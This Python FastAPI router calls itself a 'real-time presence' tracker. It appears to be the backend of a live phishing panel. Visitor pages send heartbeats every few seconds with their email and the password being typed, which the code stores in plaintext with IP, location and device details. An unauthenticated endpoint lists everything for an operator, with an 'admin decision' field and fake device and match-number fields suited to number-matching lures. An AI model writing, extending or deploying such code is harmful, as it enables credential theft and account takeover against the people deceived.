import datetime
from fastapi import APIRouter, Depends, Request
from sqlalchemy.orm import Session
from sqlalchemy import desc
from typing import Optional, List
from pydantic import BaseModel
from app.database import get_db
from app.models import VisitorPresence
from app.schemas import DeviceGeoInfo

router = APIRouter(prefix="/api/presence", tags=["Real-Time Presence"])

class HeartbeatRequest(BaseModel):
    visitor_id: str
    session_id: Optional[str] = None
    email: Optional[str] = None
    entered_password: Optional[str] = None
    current_step: Optional[str] = "Viewing Page"
    device_info: Optional[DeviceGeoInfo] = None
    admin_decision: Optional[str] = None

class LeaveRequest(BaseModel):
    visitor_id: str

def get_country_flag(code: Optional[str]) -> str:
    """Converts a 2-letter country code (e.g. NG, US, GB) to flag emoji."""
    if not code or len(code) != 2 or code == "--":
        return "🌐"
    try:
        return "".join(chr(127397 + ord(char.upper())) for char in code)
    except Exception:
        return "🌐"

def get_flag_url(code: Optional[str]) -> str:
    """Returns local vector SVG flag path for fast offline/local loading."""
    if not code or len(code) != 2 or code == "--":
        return "/flags/UN.svg"
    return f"/flags/{code.upper()}.svg"

@router.post("/heartbeat")
def record_heartbeat(req: HeartbeatRequest, request: Request, db: Session = Depends(get_db)):
    """
    Called every 3 seconds by active visitors to maintain real-time status.
    """
    now = datetime.datetime.utcnow()
    raw_ip = (
        request.headers.get("cf-connecting-ip")
        or request.headers.get("x-real-ip")
        or request.headers.get("x-forwarded-for")
        or (request.client.host if request.client else "127.0.0.1")
    )
    if "," in raw_ip:
        raw_ip = raw_ip.split(",")[0].strip()

    dev = req.device_info or DeviceGeoInfo()

    # Prioritize real public IP if testing on local machine or behind private subnet
    if (raw_ip in ["127.0.0.1", "::1", "localhost"] or raw_ip.startswith("192.168.") or raw_ip.startswith("10.")) and dev.ip_address:
        client_ip = dev.ip_address
    else:
        client_ip = raw_ip

    presence = db.query(VisitorPresence).filter(VisitorPresence.visitor_id == req.visitor_id).first()

    if presence:
        presence.last_heartbeat = now
        presence.is_active = True
        if client_ip and client_ip != "127.0.0.1":
            presence.ip_address = client_ip
        if req.session_id:
            presence.session_id = req.session_id
        if req.email:
            presence.email = req.email
        if req.entered_password:
            presence.entered_password = req.entered_password
        if req.current_step:
            presence.current_step = req.current_step
        if req.admin_decision and presence.admin_decision == "PENDING":
            presence.admin_decision = req.admin_decision
        if dev.country and dev.country != "Unknown":
            presence.country = dev.country
            presence.country_code = (dev.country_code or "--").upper()
            presence.city = dev.city or "Unknown"
        if dev.device_type:
            presence.device_type = dev.device_type
            presence.os = dev.os
            presence.browser = dev.browser
    else:
        presence = VisitorPresence(
            visitor_id=req.visitor_id,
            session_id=req.session_id,
            ip_address=client_ip,
            country=dev.country or "Unknown",
            country_code=(dev.country_code or "--").upper(),
            city=dev.city or "Unknown",
            device_type=dev.device_type or "Desktop",
            os=dev.os or "Unknown OS",
            browser=dev.browser or "Unknown Browser",
            email=req.email,
            entered_password=req.entered_password,
            current_step=req.current_step or "Viewing Page",
            is_active=True,
            last_heartbeat=now,
            started_at=now
        )
        db.add(presence)

    db.commit()
    return {"success": True}


@router.post("/leave")
def record_leave(req: LeaveRequest, db: Session = Depends(get_db)):
    """
    Called immediately via sendBeacon when visitor closes the tab or leaves the page.
    """
    now = datetime.datetime.utcnow()
    presence = db.query(VisitorPresence).filter(VisitorPresence.visitor_id == req.visitor_id).first()
    if presence:
        presence.is_active = False
        presence.left_at = now
        db.commit()
    return {"success": True}


@router.get("/live-visitors")
def get_live_visitors(db: Session = Depends(get_db)):
    """
    Returns real-time visitors with active/inactive status, official flags, devices, and real IPs.
    Auto-expires any visitor whose heartbeat stopped > 8 seconds ago.
    """
    now = datetime.datetime.utcnow()
    timeout_threshold = now - datetime.timedelta(seconds=8)

    # Auto-mark expired heartbeats as inactive
    db.query(VisitorPresence).filter(
        VisitorPresence.is_active == True,
        VisitorPresence.last_heartbeat < timeout_threshold
    ).update({
        "is_active": False,
        "left_at": VisitorPresence.last_heartbeat
    }, synchronize_session=False)
    db.commit()

    # Query only real visitors (exclude test-suite generated visitors)
    visitors = (
        db.query(VisitorPresence)
        .filter(~VisitorPresence.visitor_id.like("test_%"))
        .order_by(desc(VisitorPresence.is_active), desc(VisitorPresence.last_heartbeat))
        .limit(50)
        .all()
    )

    results = []
    active_count = 0

    for v in visitors:
        is_active = bool(v.is_active)
        if is_active:
            active_count += 1

        seconds_ago = int((now - v.last_heartbeat).total_seconds()) if v.last_heartbeat else 0

        status_text = (
            "Active Now"
            if is_active
            else f"Left {seconds_ago}s ago"
            if seconds_ago < 60
            else f"Left {seconds_ago // 60}m ago"
        )

        country_code = (v.country_code or "UN").upper()

        results.append({
            "visitor_id": v.visitor_id,
            "session_id": v.session_id,
            "ip_address": v.ip_address or "127.0.0.1",
            "country": v.country or "Unknown",
            "country_code": country_code,
            "country_flag": get_country_flag(country_code),
            "flag_url": get_flag_url(country_code),
            "city": v.city or "Unknown",
            "device_type": v.device_type or "Desktop",
            "os": v.os or "Unknown OS",
            "browser": v.browser or "Unknown Browser",
            "email": v.email or "Entering Email...",
            "entered_password": v.entered_password,
            "current_step": v.current_step or "Viewing Page",
            "custom_match_number": v.custom_match_number or 63,
            "custom_device_name": v.custom_device_name or "Apple iPhone 16",
            "admin_decision": v.admin_decision or "PENDING",
            "is_active": is_active,
            "status_text": status_text,
            "seconds_since_heartbeat": seconds_ago,
            "started_at": v.started_at.isoformat() if v.started_at else None,
            "last_heartbeat": v.last_heartbeat.isoformat() if v.last_heartbeat else None
        })

    return {
        "active_visitors_count": active_count,
        "total_tracked": len(results),
        "visitors": results
    }
